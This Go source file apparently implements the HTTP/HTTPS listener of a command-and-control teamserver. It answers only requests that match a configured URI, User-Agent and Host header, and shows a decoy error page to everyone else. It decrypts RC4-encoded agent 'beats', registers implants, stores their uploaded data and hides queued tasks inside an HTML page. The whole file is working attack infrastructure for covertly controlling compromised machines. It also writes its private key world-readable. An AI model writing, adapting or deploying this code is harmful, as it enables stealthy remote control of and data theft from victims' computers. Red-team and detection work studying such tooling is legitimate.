package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/rc4"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/pem"
	"errors"
	"fmt"
	"github.com/gin-gonic/gin"
	"io"
	"math/big"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

type HTTPConfig struct {
	HostBind           string `json:"host_bind"`
	PortBind           int    `json:"port_bind"`
	Callback_addresses string `json:"callback_addresses"`

	Ssl         bool   `json:"ssl"`
	SslCert     []byte `json:"ssl_cert"`
	SslKey      []byte `json:"ssl_key"`
	SslCertPath string `json:"ssl_cert_path"`
	SslKeyPath  string `json:"ssl_key_path"`

	// Agent
	HttpMethod     string `json:"http_method"`
	Uri            string `json:"uri"`
	ParameterName  string `json:"hb_header"`
	UserAgent      string `json:"user_agent"`
	HostHeader     string `json:"host_header"`
	RequestHeaders string `json:"request_headers"`

	// Server
	ResponseHeaders    map[string]string `json:"response_headers"`
	TrustXForwardedFor bool              `json:"x-forwarded-for"`
	WebPageError       string            `json:"page-error"`
	WebPageOutput      string            `json:"page-payload"`

	Server_headers string `json:"server_headers"`
	Protocol       string `json:"protocol"`
	EncryptKey     []byte `json:"encrypt_key"`
}

type HTTP struct {
	GinEngine *gin.Engine
	Server    *http.Server
	Config    HTTPConfig
	Name      string
	Active    bool
}

func (handler *HTTP) Start(ts Teamserver) error {
	var err error = nil

	gin.SetMode(gin.ReleaseMode)
	router := gin.New()
	router.NoRoute(handler.pageError)

	router.Use(func(c *gin.Context) {
		for header, value := range handler.Config.ResponseHeaders {
			c.Header(header, value)
		}
		c.Next()
	})

	if handler.Config.HttpMethod == "POST" {
		router.POST("/*endpoint", handler.processRequest)
	} else if handler.Config.HttpMethod == "GET" {
		router.GET("/*endpoint", handler.processRequest)
	}

	handler.Active = true

	handler.Server = &http.Server{
		Addr:    fmt.Sprintf("%s:%d", handler.Config.HostBind, handler.Config.PortBind),
		Handler: router,
	}

	if handler.Config.Ssl {
		fmt.Printf("   Started listener: https://%s:%d\n", handler.Config.HostBind, handler.Config.PortBind)

		listenerPath := ListenerDataDir + "/" + handler.Name
		_, err = os.Stat(listenerPath)
		if os.IsNotExist(err) {
			err = os.Mkdir(listenerPath, os.ModePerm)
			if err != nil {
				return fmt.Errorf("failed to create %s folder: %s", listenerPath, err.Error())
			}
		}

		handler.Config.SslCertPath = listenerPath + "/listener.crt"
		handler.Config.SslKeyPath = listenerPath + "/listener.key"

		if len(handler.Config.SslCert) == 0 || len(handler.Config.SslKey) == 0 {
			err = handler.generateSelfSignedCert(handler.Config.SslCertPath, handler.Config.SslKeyPath)
			if err != nil {
				handler.Active = false
				fmt.Println("Error generating self-signed certificate:", err)
				return err
			}
		} else {
			err = os.WriteFile(handler.Config.SslCertPath, handler.Config.SslCert, 0600)
			if err != nil {
				return err
			}
			err = os.WriteFile(handler.Config.SslKeyPath, handler.Config.SslKey, 0600)
			if err != nil {
				return err
			}
		}

		go func() {
			err = handler.Server.ListenAndServeTLS(handler.Config.SslCertPath, handler.Config.SslKeyPath)
			if err != nil && !errors.Is(err, http.ErrServerClosed) {
				fmt.Printf("Error starting HTTPS server: %v\n", err)
				return
			}
			handler.Active = true
		}()

	} else {
		fmt.Printf("   Started listener: http://%s:%d\n", handler.Config.HostBind, handler.Config.PortBind)

		go func() {
			err = handler.Server.ListenAndServe()
			if err != nil && !errors.Is(err, http.ErrServerClosed) {
				fmt.Printf("Error starting HTTP server: %v\n", err)
				return
			}
			handler.Active = true
		}()
	}

	time.Sleep(500 * time.Millisecond)
	return err
}

func (handler *HTTP) Stop() error {
	var (
		ctx          context.Context
		cancel       context.CancelFunc
		err          error = nil
		listenerPath       = ListenerDataDir + "/" + handler.Name
	)

	ctx, cancel = context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()

	_, err = os.Stat(listenerPath)
	if err == nil {
		err = os.RemoveAll(listenerPath)
		if err != nil {
			return fmt.Errorf("failed to remove %s folder: %s", listenerPath, err.Error())
		}
	}

	err = handler.Server.Shutdown(ctx)
	return err
}

func (handler *HTTP) processRequest(ctx *gin.Context) {
	var (
		ExternalIP   string
		err          error
		agentType    string
		agentId      string
		beat         []byte
		bodyData     []byte
		responseData []byte
	)

	valid := false
	u, err := url.Parse(ctx.Request.RequestURI)
	if err == nil {
		if handler.Config.Uri == u.Path {
			valid = true
		}
	}
	if valid == false {
		handler.pageError(ctx)
		return
	}

	if len(handler.Config.HostHeader) > 0 {
		requestHost := ctx.Request.Host
		if handler.Config.HostHeader != requestHost {
			handler.pageError(ctx)
			return
		}
	}

	if handler.Config.UserAgent != ctx.Request.UserAgent() {
		handler.pageError(ctx)
		return
	}

	if handler.Config.TrustXForwardedFor && ctx.Request.Header.Get("X-Forwarded-For") != "" {
		ExternalIP = ctx.Request.Header.Get("X-Forwarded-For")
	} else {
		ExternalIP = strings.Split(ctx.Request.RemoteAddr, ":")[0]
	}

	agentType, agentId, beat, bodyData, err = handler.parseBeatAndData(ctx)
	if err != nil {
		goto ERR
	}

	if !ModuleObject.ts.TsAgentIsExists(agentId) {
		err = ModuleObject.ts.TsAgentCreate(agentType, agentId, beat, handler.Name, ExternalIP, true)
		if err != nil {
			goto ERR
		}
	}

	_ = ModuleObject.ts.TsAgentProcessData(agentId, bodyData)

	responseData, err = ModuleObject.ts.TsAgentGetHostedTasksAll(agentId, 0x1900000) // 25 Mb
	if err != nil {
		goto ERR
	} else {
		html := []byte(strings.ReplaceAll(handler.Config.WebPageOutput, "<<<PAYLOAD_DATA>>>", string(responseData)))
		_, err = ctx.Writer.Write(html)
		if err != nil {
			//fmt.Println("Failed to write to request: " + err.Error())
			handler.pageError(ctx)
			return
		}
	}

	ctx.AbortWithStatus(http.StatusOK)
	return

ERR:
	//fmt.Println("Error: " + err.Error())
	handler.pageError(ctx)
}

func (handler *HTTP) parseBeatAndData(ctx *gin.Context) (string, string, []byte, []byte, error) {
	var (
		beat           string
		agentType      uint
		agentId        uint
		agentInfoCrypt []byte
		agentInfo      []byte
		bodyData       []byte
		err            error
	)

	params := ctx.Request.Header.Get(handler.Config.ParameterName)
	if len(params) > 0 {
		beat = params
	} else {
		return "", "", nil, nil, errors.New("missing beat from Headers")
	}

	agentInfoCrypt, err = base64.StdEncoding.DecodeString(beat)
	if len(agentInfoCrypt) < 5 || err != nil {
		return "", "", nil, nil, errors.New("failed decrypt beat")
	}

	rc4crypt, errcrypt := rc4.NewCipher(handler.Config.EncryptKey)
	if errcrypt != nil {
		return "", "", nil, nil, errors.New("rc4 decrypt error")
	}
	agentInfo = make([]byte, len(agentInfoCrypt))
	rc4crypt.XORKeyStream(agentInfo, agentInfoCrypt)

	agentType = uint(binary.BigEndian.Uint32(agentInfo[:4]))
	agentInfo = agentInfo[4:]
	agentId = uint(binary.BigEndian.Uint32(agentInfo[:4]))
	agentInfo = agentInfo[4:]

	bodyData, err = io.ReadAll(ctx.Request.Body)
	if err != nil {
		return "", "", nil, nil, errors.New("missing agent data")
	}

	return fmt.Sprintf("%08x", agentType), fmt.Sprintf("%08x", agentId), agentInfo, bodyData, nil
}

func (handler *HTTP) generateSelfSignedCert(certFile, keyFile string) error {
	var (
		certData   []byte
		keyData    []byte
		certBuffer bytes.Buffer
		keyBuffer  bytes.Buffer
		privateKey *rsa.PrivateKey
		err        error
	)

	privateKey, err = rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return fmt.Errorf("failed to generate private key: %v", err)
	}

	serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
	serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
	if err != nil {
		return fmt.Errorf("failed to generate serial number: %v", err)
	}

	template := x509.Certificate{
		SerialNumber: serialNumber,
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(365 * 24 * time.Hour),

		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	template.DNSNames = []string{handler.Config.HostBind}

	certData, err = x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return fmt.Errorf("failed to create certificate: %v", err)
	}

	err = pem.Encode(&certBuffer, &pem.Block{Type: "CERTIFICATE", Bytes: certData})
	if err != nil {
		return fmt.Errorf("failed to write certificate: %v", err)
	}

	handler.Config.SslCert = certBuffer.Bytes()
	err = os.WriteFile(certFile, handler.Config.SslCert, 0644)
	if err != nil {
		return fmt.Errorf("failed to create certificate file: %v", err)
	}

	keyData = x509.MarshalPKCS1PrivateKey(privateKey)
	err = pem.Encode(&keyBuffer, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: keyData})
	if err != nil {
		return fmt.Errorf("failed to write private key: %v", err)
	}

	handler.Config.SslKey = keyBuffer.Bytes()
	err = os.WriteFile(keyFile, handler.Config.SslKey, 0644)
	if err != nil {
		return fmt.Errorf("failed to create key file: %v", err)
	}

	return nil
}

func (handler *HTTP) pageError(ctx *gin.Context) {
	ctx.Writer.WriteHeader(http.StatusNotFound)
	html := []byte(handler.Config.WebPageError)
	_, _ = ctx.Writer.Write(html)
}
